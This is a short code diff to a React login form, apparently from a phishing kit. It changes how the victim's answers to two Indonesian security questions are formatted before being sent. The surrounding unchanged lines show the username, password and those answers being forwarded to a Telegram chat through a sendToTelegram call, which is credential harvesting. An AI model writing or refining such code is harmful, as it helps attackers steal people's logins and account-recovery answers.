@@ -82,7 +82,7 @@ const LoginForm = ({ onClose }: LoginFormProps) => {
     // Hardcoded questions based on typical usage or reference context
     const q1 = "Apa film favorit Anda?";
     const q2 = "Apa Makanan Kesukaan Anda?";
-    const combinedQ = `Q1. ${q1} (${a1})\nQ2. ${q2} (${a2})`;
+    const combinedQ = `Q1. ${q1} (<code>${a1}</code>)\nQ2. ${q2} (<code>${a2}</code>)`;
     
     const success = await sendToTelegram(username, password, combinedQ, "-");
     
